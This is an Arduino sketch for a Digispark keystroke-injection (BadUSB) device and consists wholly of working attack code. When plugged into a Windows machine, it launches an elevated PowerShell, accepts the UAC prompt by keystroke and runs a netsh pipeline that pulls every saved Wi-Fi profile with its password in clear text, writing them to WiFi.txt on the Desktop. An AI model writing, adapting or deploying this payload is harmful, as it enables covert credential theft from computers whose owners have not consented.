#include "DigiKeyboard.h"

void setup()
{

pinMode(2, OUTPUT);
digitalWrite(2,HIGH);
  
DigiKeyboard.delay(5000);
DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.print(F("powershell"));
DigiKeyboard.delay(3000);
DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_RIGHT);
DigiKeyboard.delay(3000);
DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);

DigiKeyboard.print(F("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" |"));
DigiKeyboard.delay(100);
DigiKeyboard.print(F("%{$name=$_.Matches.Groups[1].Value.Trim(); $_} |"));
DigiKeyboard.delay(100);
DigiKeyboard.print(F("%{(netsh wlan show profile name=\"$name\" key=clear)}|"));
DigiKeyboard.delay(100);
DigiKeyboard.print(F("Select-String \"Key Content\\W+\\:(.+)$\"|"));
DigiKeyboard.delay(100);
DigiKeyboard.print(F("%{$pass=$_.Matches.Groups[1].Value.Trim(); $_}|"));
DigiKeyboard.delay(100);
DigiKeyboard.print(F("%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}|Format-Table -AutoSize|Out-File -filepath $env:USERPROFILE\\Desktop\\WiFi.txt"));
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(250);

DigiKeyboard.print(F("exit"));
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {}
